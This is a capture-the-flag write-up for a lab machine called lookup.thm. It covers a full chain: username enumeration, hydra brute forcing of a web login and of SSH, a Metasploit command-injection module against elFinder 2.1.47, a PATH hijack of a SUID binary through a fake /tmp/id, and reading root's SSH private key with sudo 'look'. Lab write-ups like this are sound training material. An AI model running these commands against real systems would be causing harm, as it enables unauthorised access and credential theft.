# Recon

`nmap -A -T4 lookup.thm`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8e:1c:b7:7d:d2:d5:e0:41:ad:43:51:b5:e8:7b:cb:85 (RSA)
|   256 47:87:b4:e5:83:eb:99:95:79:34:61:a4:8b:30:ff:62 (ECDSA)
|_  256 ea:e8:51:90:2b:9c:80:55:69:54:36:1e:57:7c:4a:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

# Username Enumeration

- Detailed or verbose error output can result in unnecessary disclosure of information, which can make it possible for an attacker to enumerate usernames. 

Upon attempting to login as the user `admin` on the web app, the error message displays: "Wrong password. Please try again. Redirecting in 3 seconds." 
Using the credentials with username `test` and password `test` results in the error message: "Wrong username or password. Please try again. Redirecting in 3 seconds."

- A script can be used to perform a bruteforce attack to identify valid usernames. 
`admin` and `jose`

# Password Bruteforcing 

- An attacker can perform more enumeration after the initial finding of valid usernames by using hydra to bruteforce for valid passwords. 
`hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong" 

A valid password was found for the user `jose`: `password123`

A redirect occurs to the subdomain `files.lookup.thm` upon logging in. 
Access to this subdomain can be obtained by pointing to `files.lookup.thm` in `/etc/hosts`

Append the subdomain `files.lookup.thm` to the end of the line that contains the target address pointing to `lookup.thm` 

After successfully loading `files.lookup.thm`, it loads up a web file manager called `elFinder` using version `2.1.47`
The file manager contains text files with credentials. 

- `think:nopassword`

# Initial Access

- Permission denied for SSH access using these credentials.
`ssh think@lookup.thm` 
password: `nopassword`

- Let's search up some exploits for elFinder. `searchsploit elfinder 2.1.47` indicates the use of PHP connector command injection. 
- Metasploit shows some modules that can be used, especially `exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection`
`use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection` and set the options `LHOST` as your attacking machine IP and `RHOSTS` as `files.lookup.thm`

# Execution with Unnecessary Privileges

- `find / -perm -u=s -type f 2>/dev/null`
`/usr/sbin/pwm` stands out

The binary runs the `id` command upon execution as it extracts the username and user ID to interact with the user's .passwords file. This can be exploited by using a different `id` binary created at a different path, i.e. `/tmp/id`
- Run the following to input an ID into the newly created id binary: `echo '#!/bin/bash\necho "uid=33(think) gid=33(think) groups=33(think)"' >> /tmp/id`
- Add `/tmp` to the PATH variable: `export PATH=/tmp:$PATH`
- Rerun the binary `/usr/sbin/pwm`, which returns a passwordlist for the user `think`

Bruteforce SSH access for the user `think` with hydra: `hydra -l think -P wordlist.txt lookup.thm ssh` and switch to the user `think`

The user `think` has sudo privileges to run the binary `/usr/bin/look`
GTFObins shows that this executable can read data from local files, which can be exploited by running `look '' /path/to/input-file`

Therefore, root's private SSH key could be read. 

`sudo /usr/bin/look '' /root/.ssh/id_rsa`

Paste the root user's key into an id_rsa file and change the mode: `chmod 600 id_rsa`
Login as root: `ssh -i id_rsa root@lookup.thm`

Root flag obtained.



